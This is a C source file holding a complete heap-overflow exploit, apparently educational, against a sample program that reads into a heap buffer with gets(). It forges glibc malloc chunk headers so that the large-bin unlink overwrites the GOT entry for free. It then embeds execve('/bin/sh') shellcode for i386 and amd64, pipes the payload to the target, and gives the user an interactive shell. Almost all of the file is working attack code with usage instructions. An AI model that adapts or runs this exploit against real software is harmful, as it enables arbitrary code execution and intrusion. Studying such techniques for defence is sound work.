/* example exploit for the simple program:

int main(int argv,char **argc) {
	char *pbuf1=(char*)malloc(256);
	char *pbuf2=(char*)malloc(256);

	gets(pbuf1);
	free(pbuf2);
	free(pbuf1);
}

*/

/* USAGE:
 * set EXPLOITABLE to the name of the vulnerable program,
 * and compile and run this program. */
#define EXPLOITABLE "./exploitme"

#include<stdlib.h>
#include<stdio.h>
#include<stddef.h>
#include<unistd.h>
#include<string.h>

/* ---- from malloc.c ---- */
typedef struct malloc_chunk {

  size_t      prev_size;  /* Size of previous chunk (if free).  */
  size_t      size;       /* Size in bytes, including overhead. */

  struct malloc_chunk* fd;         /* double links -- used only if free. */
  struct malloc_chunk* bk;

  /* Only used for large blocks: pointer to next larger size.  */
  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
  struct malloc_chunk* bk_nextsize;
} malloc_chunk;

#define SIZE_SZ                sizeof(size_t)
#define PREV_INUSE 0x1
#define MIN_CHUNK_SIZE        (offsetof(struct malloc_chunk, fd_nextsize))
#define MALLOC_ALIGNMENT       (2 * sizeof(size_t))
#define MALLOC_ALIGN_MASK      (MALLOC_ALIGNMENT - 1)
#define MINSIZE  \
  (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK))
#define NSMALLBINS         64
#define SMALLBIN_WIDTH    MALLOC_ALIGNMENT
#define MIN_LARGE_SIZE    (NSMALLBINS * SMALLBIN_WIDTH)
#define request2size(req)                                         \
  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK < MINSIZE)  ?             \
   MINSIZE :                                                      \
   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK)
/* ---- end malloc.c ---- */

#ifdef __i386__

#define NON_FASTSIZE request2size(65)
/*
 mov eax,'//sh'
 shr eax, 8
 push eax
 push '/bin'
 jmp short L0
 db 'aaaa'; this word gets clobbered by malloc
 L0:
 mov ebx,esp
 xor eax,eax
 push eax
 push ebx
 mov ecx, esp
 cdq
 mov al,11
 int 0x80
*/
char shellcode[] = "\xb8\x2f\x2f\x73\x68\xc1\xe8\x08\x50\x68\x2f\x62\x69\x6e"
                   "\xeb\x04\x61\x61\x61\x61\x89\xe3\x31\xc0\x50\x53\x89\xe1"
                   "\x99\xb0\x0b\xcd\x80";

    /* RETLOC is: objdump -R exploitable | grep free */
#define RETLOC 0x0804a00c
// #define RETLOC 0x08049624

#define START_ADDR 0x804b008
// #define START_ADDR 0x804a008

#endif

#ifdef __amd64__

                   /* probably could be smaller */
#define NON_FASTSIZE request2size(200)

/* shellcode is small enough that it avoids the write at bytes 32-40:
 xor     rax, rax
 cdq
 mov     rbx, '//bin/sh'
 shr     rbx, 0x8
 push    rbx
 mov     rdi, rsp
 push    rax
 push    rdi
 mov     rsi, rsp
 mov     al, 0x3b
 syscall
*/
char shellcode[] = "\x48\x31\xc0\x99\x48\xbb\x2f\x2f\x62\x69\x6e"
                   "\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7"
                   "\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05";
    /* RETLOC is: objdump -R exploitable | grep free */
#define RETLOC 0x601010
#define START_ADDR 0x602010

#endif

#define SIZE_OVERFLOW_CHUNK 256
#define RETADDR (START_ADDR + NON_FASTSIZE + 0x140)

/*  ---- what we are overwriting the heap with ----
value: 256xA - AAAAAAAA  - NON_FASTSIZE | PREV_INUSE - (NON_FASTSIZE-16)xA -
addr:  pbuf1 - prev_size -          size             -        pbuf2        -

value: AAAAAAAA  - MIN_LARGE_SIZE | PREV_INUSE - fd - bk -
addr:  prev_size -           nextsize          -    -    -

value: retloc-offsetof(malloc_chunk,bk_nextsize) -   retaddr   -
addr:                 fd_nextsize                - bk_nextsize -
 retaddr at offsetof(malloc_chunk,fd_nextsize) gets overwritten

value: nextchunk - nextchunk  AND  not NULL     - (shellcode can go here) -
addr:    fd->bk  -   bk->fd AND fd->fd_nextsize - ... ... ... ... ... ... -
 
value:          not PREV_INUSE          -
addr:  (nextchunk+MIN_LARGE_SIZE)->size -
  (NULL byte at end of string will take care of this)
 */

int main(int argc,char **argv) {
    /* the string to send the exploitable program */
    char evil_str[10000];
    /* the pipe with the exploitable program */
    int fd[2];
    int pid;

    void *p = evil_str;
    int i;

    /* fill the chunk we're overflowing */
    for(i=0;i<SIZE_OVERFLOW_CHUNK;i++)
        *(char*)p++='A';

    /* -- this is the chunk the gets freed -- */
    /* this chunk will be marked with PREV_INUSE so prev_size doesn't matter */
    ((malloc_chunk*)p)->prev_size = 0;
    /* size must be big enough to avoid the fastbin code
     * PREV_INUSE to avoid code dealing with the previous chunk */
    ((malloc_chunk*)p)->size = NON_FASTSIZE | PREV_INUSE;
    p += 2*SIZE_SZ;

    /* fill the rest of this chunk */
    for(i=0;i<NON_FASTSIZE-2*SIZE_SZ;i++)
        *(char*)p++='A';

    /* nextchunk (fake chunk after the one being freed)
     * is used to achieve an arbitrary write */
    malloc_chunk* nextchunk = (malloc_chunk*) p;

    /* prev_size can be anything as PREV_INUSE must be set */
    nextchunk->prev_size = 0;
    
    /* MIN_LARGE_SIZE to reach the code using fd_nextsize and bk_nextsize
     * PREV_INUSE to pass a test, you can only free inuse chunks */
    nextchunk->size = MIN_LARGE_SIZE | PREV_INUSE;

    /* From malloc.c:
        P->fd_nextsize->bk_nextsize = P->bk_nextsize;		       \
        P->bk_nextsize->fd_nextsize = P->fd_nextsize;		       \
     * this code performs the write for us with nextchunk as P */
    nextchunk->fd_nextsize = (malloc_chunk*) (RETLOC - offsetof(malloc_chunk,bk_nextsize));
    nextchunk->bk_nextsize = (malloc_chunk*) RETADDR;

    /* have to pass: __builtin_expect (FD->bk != P || BK->fd != P, 0) */
    p += sizeof(malloc_chunk);
    *(size_t*)p = (size_t)nextchunk - (size_t)evil_str + START_ADDR;
    nextchunk->fd = p - offsetof(malloc_chunk,bk) - (size_t)evil_str + START_ADDR;
    p += SIZE_SZ;

    /* to achieve the desired code path in free we need FD->fd_nextsize!=NULL
     * this word acts as both BK->fd and as FD->fd_nextsize
     * setting it to nextchunk satisfies both BK->fd == P
     * and FD->fd_nextsize != NULL */
    *(size_t*)p = (size_t)nextchunk - (size_t)evil_str + START_ADDR;
    nextchunk->bk = p - offsetof(malloc_chunk,fd) - (size_t)evil_str + START_ADDR;
    p += SIZE_SZ;

    /* copy the shellcode */
    memcpy(p,shellcode,sizeof(shellcode));
    p += sizeof(shellcode);

    /* write junk up until the end of next chunk
     * we need the chunk after nextchunk to not have PREV_INUSE set
     * we will simply let the null character at the end of the string overwrite
     * the LSB of the size value, 0'ing PREV_INUSE */
    while((size_t) p < (size_t) nextchunk + MIN_LARGE_SIZE + offsetof(malloc_chunk,size))
        *(char*)p++ = 'A';

    /* gets will change the newline into a 0 */
    *(char*)p++ = '\n';

    pipe(fd);
    if((pid=fork())) {
        /* parent */

        close(fd[0]);

        /* have stdout go to the pipe so cat will work */
        dup2(fd[1],1);
        close(fd[1]);

        write(1,evil_str,(char*)p-evil_str);
        fprintf(stderr,"Sent evil string, should have shell now:\n");

        /* let the user control the shell */
        system("cat -");
    } else {
        /* child */

        close(fd[1]);

        /* have the pipe go to stdin */
        dup2(fd[0],0);
        close(fd[0]);

        if(system(EXPLOITABLE)>0)
            fprintf(stderr,"exploit failed! probably your malloc is not compiled -D NDEBUG, or you have ASLR enabled\n");
    }

    return 0;
}
